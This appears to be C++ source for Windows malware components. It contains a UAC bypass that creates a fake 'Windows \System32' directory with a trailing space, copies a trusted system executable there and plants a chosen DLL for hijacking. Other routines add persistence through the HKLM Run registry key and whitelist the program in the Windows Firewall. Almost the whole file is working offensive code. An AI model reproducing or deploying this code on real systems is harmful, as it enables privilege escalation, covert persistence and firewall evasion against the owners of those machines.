#include <Windows.h>
#include <netfw.h>
#include <oleauto.h>
#include <objbase.h>
#include <string>
#include <assert.h>

using std::string;
using std::wstring;

#define escape_chars "\\\\?\\"

inline HRESULT __fastcall WindowsFirewallInitialize(
	__out INetFwProfile** WindowsFirewallProfile
);

inline HRESULT __fastcall WindowsFirewallAddProgramToFirewallTable(
	__in INetFwProfile* WindowsFirewallProfile,
	__in CONST wstring& Executable,
	__in CONST OLECHAR* RuleName
);

inline VOID __fastcall WindowsFirewallCleanUp(
	__in INetFwProfile* WindowsFirewallProfile
);

/**
 * @brief Create a fake directory %WINDIR% \System32 and place it two files:
* 	an exe and a dll
 *
 * @param [exe] name of trusted executable of Windows. Please note that this is a name, not a path.
 * @param [dll] name of trusted DLL of Windows. Please note that this is a name, not a path.
 * @param [my_dll] path of DLL to copy in fake folder. This function will create a copy of this file in %WINDIR% \System32, named as [dll] parameter.
 * @return Last error.
 *
 * @warning Throws an exception if there is no memory available in heap segment.
 **/

int privilege_escalation(
	const char* exe,
	const char* dll,
	const char* my_dll
)
{
	char* system_path = NULL;
	int windows_path_length = 0;
	int system_path_length = 0;
	const char* system_32 = "\\System32";
	//const char* escape_chars = "\\\\?\\";

	char* fake_exe = NULL;
	char* fake_system = NULL;
	char* fake_dll = NULL;
	char* fake_windows = NULL;
	char* real_exe = NULL;
	char* real_system = NULL;

	size_t sz_fake_system = (strlen(escape_chars) + strlen(system_32) + 1)
		* sizeof(char) + sizeof(char);
	size_t sz_fake_exe = (strlen(escape_chars) + strlen(exe) + strlen(system_32) + 1)
		* sizeof(char) + sizeof(char);
	size_t sz_fake_dll = (strlen(escape_chars) + strlen(dll) + strlen(system_32) + 1)
		* sizeof(char) + sizeof(char);
	size_t sz_fake_windows = (strlen(escape_chars) + 1)
		* sizeof(char) + sizeof(char);

	size_t sz_path_to_real_exe = (strlen(escape_chars) + strlen(exe))
		* sizeof(char) + sizeof(char);

	windows_path_length = GetWindowsDirectoryA(NULL, 0);

	sz_fake_exe += windows_path_length;
	sz_fake_system += windows_path_length;
	sz_fake_dll += windows_path_length;
	sz_fake_windows += windows_path_length;

	system_path = (char*)malloc(windows_path_length);
	assert(system_path);

	GetWindowsDirectoryA(system_path, windows_path_length);
	fake_system = (char*)malloc(sz_fake_system);
	assert(fake_system);
	fake_exe = (char*)malloc(sz_fake_exe);
	assert(fake_exe);

	fake_dll = (char*)malloc(sz_fake_dll);
	assert(fake_dll);

	fake_windows = (char*)malloc(sz_fake_windows);
	assert(fake_windows);

	SecureZeroMemory(fake_exe, sz_fake_exe);
	SecureZeroMemory(fake_system, sz_fake_system);
	SecureZeroMemory(fake_dll, sz_fake_dll);
	SecureZeroMemory(fake_windows, sz_fake_windows);

	strcat_s(fake_windows, sz_fake_windows, escape_chars);
	strcat_s(fake_windows, sz_fake_windows, system_path);
	strcat_s(fake_windows, sz_fake_windows, " ");

	strcat_s(fake_system, sz_fake_system, fake_windows);
	strcat_s(fake_system, sz_fake_system, system_32);

	strcat_s(fake_exe, sz_fake_exe, fake_system);
	strcat_s(fake_exe, sz_fake_exe, "\\");
	strcat_s(fake_exe, sz_fake_exe, exe);

	strcat_s(fake_dll, sz_fake_dll, fake_system);
	strcat_s(fake_dll, sz_fake_dll, "\\");
	strcat_s(fake_dll, sz_fake_dll, dll);

	CreateDirectoryA(fake_windows, NULL);
	CreateDirectoryA(fake_system, NULL);

	system_path_length = GetSystemDirectoryA(NULL, 0);
	sz_path_to_real_exe += system_path_length;

	real_exe = (char*)malloc(sz_path_to_real_exe + sizeof(char));
	assert(real_exe);

	real_system = (char*)malloc(system_path_length + sizeof(char));
	assert(real_system);

	SecureZeroMemory(real_exe, sz_path_to_real_exe + sizeof(char));

	GetSystemDirectoryA(real_system, system_path_length);

	strcat_s(real_exe, sz_path_to_real_exe, escape_chars);
	strcat_s(real_exe, sz_path_to_real_exe, real_system);
	strcat_s(real_exe, sz_path_to_real_exe, "\\");
	strcat_s(real_exe, sz_path_to_real_exe, exe);

	CopyFileA(real_exe, fake_exe, FALSE);
	CopyFileA(my_dll, fake_dll, FALSE);

	free(fake_system);
	free(fake_exe);
	free(fake_dll);
	free(fake_windows);
	free(real_exe);
	free(real_system);

	return GetLastError();
}

BOOL is_admin()
{
	BOOL b = FALSE;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup;

	b = AllocateAndInitializeSid(
		&NtAuthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 
		0,
		0,
		0,
		0,
		0,
		&AdministratorsGroup);
	
	if (b == TRUE)
	{
		if (CheckTokenMembership(
			NULL,
			AdministratorsGroup,
			&b
		) == FALSE)
		{
			b = FALSE;
		}

		FreeSid(AdministratorsGroup);
	}

	return b;
}

DWORD get_persistence(
	const char* argv,
	const char* value_name,
	BOOL is_absolute
)
{
	HKEY h_key = NULL;
	LSTATUS ls = 0;
	char path[MAX_PATH] = {};

	if (is_absolute == FALSE)
	{
		//Retrieve full path of this exe
		GetFullPathNameA(
			argv,
			MAX_PATH,
			path,
			0
		);
	}
	else
	{
		strcpy_s(path, MAX_PATH, argv);
	}

	if (RegCreateKeyExA(
		HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&h_key,
		NULL
	) == ERROR_SUCCESS)
	{
		RegSetValueExA(
			h_key,
			value_name,
			0,
			REG_SZ,
			(const BYTE*)path,
			sizeof(char) * strlen(path) + sizeof(char)
		);
	}

	return GetLastError();
}

inline HRESULT __fastcall WindowsFirewallAddEntryInFirewall(
	CONST string& Executable,
	CONST OLECHAR* RuleName
)
{
	HRESULT hResult = S_OK;
	HRESULT ComInit = E_FAIL;
	INetFwProfile* WindowsFirewallProfile = NULL;
	std::wstring wExecutable(&Executable[0], &Executable[Executable.length()]);

	ComInit = CoInitializeEx(
		NULL,
		COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE
	);

	if (ComInit != RPC_E_CHANGED_MODE)
		if (FAILED(ComInit))
			goto ReleaseResources;

	hResult = WindowsFirewallInitialize(&WindowsFirewallProfile);

	if (FAILED(hResult))
		goto ReleaseResources;

	hResult = WindowsFirewallAddProgramToFirewallTable(WindowsFirewallProfile, wExecutable, RuleName);

	if (FAILED(hResult))
		goto ReleaseResources;

ReleaseResources:

	WindowsFirewallCleanUp(WindowsFirewallProfile);

	if (SUCCEEDED(ComInit))
		CoUninitialize();

	return hResult;
}

inline HRESULT __fastcall WindowsFirewallInitialize(
	__out INetFwProfile** WindowsFirewallProfile
)
{
	HRESULT hResult = S_OK;
	INetFwMgr* WindowsFirewallManager = NULL;
	INetFwPolicy* WindowsFirewallPolicy = NULL;

	*WindowsFirewallProfile = NULL;

	hResult = CoCreateInstance(
		__uuidof(NetFwMgr),
		NULL,
		CLSCTX_INPROC_SERVER,
		__uuidof(INetFwMgr),
		(void**)&WindowsFirewallManager
	);

	if (FAILED(hResult))
		goto ReleaseResources;

	hResult = WindowsFirewallManager->get_LocalPolicy(&WindowsFirewallPolicy);

	if (FAILED(hResult))
		goto ReleaseResources;

	hResult = WindowsFirewallPolicy->get_CurrentProfile(WindowsFirewallProfile);

	if (FAILED(hResult))
		goto ReleaseResources;

ReleaseResources:

	if (WindowsFirewallPolicy)
		WindowsFirewallPolicy->Release();

	if (WindowsFirewallManager)
		WindowsFirewallManager->Release();

	return hResult;
}

inline HRESULT __fastcall WindowsFirewallIsEnabledThisProgram(
	__in INetFwProfile* WindowsFirewallProfile,
	__in CONST wstring& Executable,
	__out PBOOL IsEnabled
)
{
	HRESULT hResult = S_OK;
	BSTR BstrProcessImageFileName = NULL;
	VARIANT_BOOL VBIsEnabled = VARIANT_FALSE;
	INetFwAuthorizedApplication* TargetProgram = NULL;
	INetFwAuthorizedApplications* SnapshotPrograms = NULL;

	*IsEnabled = FALSE;

	hResult = WindowsFirewallProfile->get_AuthorizedApplications(&SnapshotPrograms);
	if (FAILED(hResult))
		goto ReleaseResources;

	BstrProcessImageFileName = SysAllocString(Executable.c_str());
	if (!BstrProcessImageFileName)
	{
		hResult = E_OUTOFMEMORY;
		goto ReleaseResources;
	}

	hResult = SnapshotPrograms->Item(BstrProcessImageFileName, &TargetProgram);
	if (SUCCEEDED(hResult))
	{
		hResult = TargetProgram->get_Enabled(&VBIsEnabled);
		if (FAILED(hResult))
			goto ReleaseResources;
		if (VBIsEnabled != VARIANT_FALSE)
			*IsEnabled = TRUE;
	}
	else
		hResult = S_OK;

ReleaseResources:

	if (BstrProcessImageFileName)
		SysFreeString(BstrProcessImageFileName);

	if (SnapshotPrograms)
		SnapshotPrograms->Release();

	if (TargetProgram)
		TargetProgram->Release();

	return hResult;
}

inline HRESULT __fastcall WindowsFirewallAddProgramToFirewallTable(
	__in INetFwProfile* WindowsFirewallProfile,
	__in CONST wstring& Executable,
	__in CONST OLECHAR* RuleName
)
{
	BOOL IsEnabled = FALSE;
	HRESULT hResult = S_OK;

	hResult = WindowsFirewallIsEnabledThisProgram(
		WindowsFirewallProfile,
		Executable,
		&IsEnabled);

	if (FAILED(hResult))
		return hResult;
	if (IsEnabled)
		return S_OK;

	INetFwAuthorizedApplication* TargetProgram = NULL;
	INetFwAuthorizedApplications* SnapshotPrograms = NULL;
	BSTR BstrProcessImageName = NULL;
	BSTR BstrServiceName = NULL;

	hResult = WindowsFirewallProfile->get_AuthorizedApplications(&SnapshotPrograms);
	if (FAILED(hResult))
		goto ReleaseResources;

	hResult = CoCreateInstance(
		__uuidof(NetFwAuthorizedApplication),
		NULL,
		CLSCTX_INPROC_SERVER,
		__uuidof(INetFwAuthorizedApplication),
		(void**)&TargetProgram
	);

	if (FAILED(hResult))
		goto ReleaseResources;

	BstrProcessImageName = SysAllocString(Executable.c_str());
	if (!BstrProcessImageName)
	{
		hResult = E_OUTOFMEMORY;
		goto ReleaseResources;
	}

	hResult = TargetProgram->put_ProcessImageFileName(BstrProcessImageName);
	if (FAILED(hResult))
		goto ReleaseResources;

	BstrServiceName = SysAllocString(RuleName);
	if (!BstrServiceName)
	{
		hResult = E_OUTOFMEMORY;
		goto ReleaseResources;
	}

	hResult = TargetProgram->put_Name(BstrServiceName);
	if (FAILED(hResult))
		goto ReleaseResources;

	hResult = SnapshotPrograms->Add(TargetProgram);
	if (FAILED(hResult))
		goto ReleaseResources;

ReleaseResources:

	if (BstrProcessImageName)
		SysFreeString(BstrProcessImageName);

	if (BstrServiceName)
		SysFreeString(BstrServiceName);

	if (TargetProgram)
		TargetProgram->Release();

	if (SnapshotPrograms)
		SnapshotPrograms->Release();

	return hResult;
}

inline VOID __fastcall WindowsFirewallCleanUp(
	__in INetFwProfile* WindowsFirewallProfile
)
{
	if (WindowsFirewallProfile)
		WindowsFirewallProfile->Release();
}